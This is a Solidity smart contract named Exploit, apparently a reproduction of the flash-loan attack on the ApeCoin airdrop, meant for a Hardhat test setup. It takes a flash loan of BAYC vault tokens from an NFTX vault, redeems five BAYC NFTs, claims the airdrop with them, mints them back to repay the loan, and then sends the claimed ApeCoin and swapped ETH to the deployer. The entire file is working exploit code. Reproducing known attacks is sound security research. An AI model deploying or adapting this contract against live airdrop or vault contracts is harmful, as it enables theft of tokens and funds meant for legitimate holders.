//SPDX-License-Identifier: Unlicense
pragma solidity ^0.8.0;
import "hardhat/console.sol";

interface IERC3156FlashBorrowerUpgradeable {
    function onFlashLoan(
        address initiator,
        address token,
        uint256 amount,
        uint256 fee,
        bytes calldata data
    ) external returns (bytes32);
}

interface IBaycNFT {
    function safeTransferFrom(address,address,uint256) external;
    function setApprovalForAll(address operator, bool approved) external;
}

interface IERC20 {
    function approve(address spender, uint256 amount) external returns (bool);
    function transfer(address to, uint256 amount) external;
    function balanceOf(address owner) external returns (uint256);
}

interface INFTXVault {
    function flashLoan(
        IERC3156FlashBorrowerUpgradeable receiver,
        address token,
        uint256 amount,
        bytes memory data
    ) external returns (bool);

    function mint(uint256[] calldata tokenIds, uint256[] calldata amounts) external returns (uint256);
    function redeem(uint256 amount, uint256[] calldata specificIds) external returns (uint256[] memory);
}

interface ISushiSwapRouter {
    function swapExactTokensForETH(
        uint amountIn, 
        uint amountOutMin, 
        address[] calldata path, 
        address to, 
        uint deadline
    ) external returns (uint[] memory amounts);
}

interface IApeCoinAirdropManager {
    function claimTokens() external;
}

contract Exploit is IERC3156FlashBorrowerUpgradeable{
    
    address private immutable owner;
    
    IBaycNFT private immutable baycNft;

    INFTXVault private immutable nftxVault;

    ISushiSwapRouter private immutable sushiSwapRouter;

    IApeCoinAirdropManager private immutable apeCoinAirdropManager;

    IERC20 private immutable apeCoin;
    
    constructor(
        address baycNftAddr, 
        address nftxVaultAddr, 
        address sushiSwapRouterAddr,
        address apeCoinAirdropManagerAddr,
        address apeCoinAddr
    ) {
        owner = msg.sender;
        baycNft = IBaycNFT(baycNftAddr);
        nftxVault = INFTXVault(nftxVaultAddr);
        sushiSwapRouter = ISushiSwapRouter(sushiSwapRouterAddr);
        apeCoinAirdropManager = IApeCoinAirdropManager(apeCoinAirdropManagerAddr);
        apeCoin = IERC20(apeCoinAddr);
    }

    function onFlashLoan(
        address user, 
        address, 
        uint256 value, 
        uint256 fee, 
        bytes calldata
    ) external override returns (bytes32) {
    
        require(msg.sender == address(nftxVault), "Not calling from NFTX vault");
        require(user == address(this), "User is not this contract");
        require(IERC20(address(nftxVault)).approve(address(nftxVault), value), "approve failed");

        //randomly redeem 5 BAYC from NTFX vault
        uint256[] memory tokenIdsRedeemed = nftxVault.redeem(5, new uint256[](0));
        require(tokenIdsRedeemed.length == 5, "Less than 5 BAYC are redeemed");

        //claim airdrop with 6 BAYC
        apeCoinAirdropManager.claimTokens();
        require(apeCoin.balanceOf(address(this)) == 60564 ether, "Less than 60564 ape coin are claimed");

        //mint bayc token to return flash loan
        baycNft.setApprovalForAll(address(nftxVault), true);
        uint256[] memory tokenIdsToMint = new uint256[](tokenIdsRedeemed.length + 1);
        for(uint256 i = 0; i < tokenIdsToMint.length-1; i++) {
            tokenIdsToMint[i] = tokenIdsRedeemed[i];
        }
        tokenIdsToMint[tokenIdsToMint.length - 1] = 1060;
        
        uint256 counts = nftxVault.mint(tokenIdsToMint, new uint256[](0));
        require(counts == tokenIdsToMint.length, "Didn't mint token with all BAYC");
        require(value + fee < IERC20(address(nftxVault)).balanceOf(address(this)), "Not enough token to pay back flash loan");
        
        //revoke approval just for safety
        baycNft.setApprovalForAll(address(nftxVault), false);

        return bytes32(keccak256("ERC3156FlashBorrower.onFlashLoan"));
    }

    function onERC721Received(
        address, 
        address, 
        uint256, 
        bytes calldata
    ) external pure returns (bytes4) {
        return this.onERC721Received.selector;
    }

    function execute() external {
        require(msg.sender == owner, "Hey! It is not your ApeCoin");
        uint256 borrowAmount = 52 ether / 10;
        nftxVault.flashLoan(IERC3156FlashBorrowerUpgradeable(address(this)), address(nftxVault), borrowAmount, "");

        //We should have 60564 * 10^18 ApeCoin and 0.2 bayc token at this point
        apeCoin.transfer(owner, apeCoin.balanceOf(address(this)));

        //swap the remaining 0.2 bayc to ETH
        address WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
        address[] memory path = new address[](2);
        path[0] = address(nftxVault);
        path[1] = WETH;
        IERC20(address(nftxVault)).approve(address(sushiSwapRouter), type(uint).max);

        sushiSwapRouter.swapExactTokensForETH(
            IERC20(address(nftxVault)).balanceOf(address(this)), 
            0, 
            path, 
            owner, 
            block.timestamp + 1 days
        );
    }
}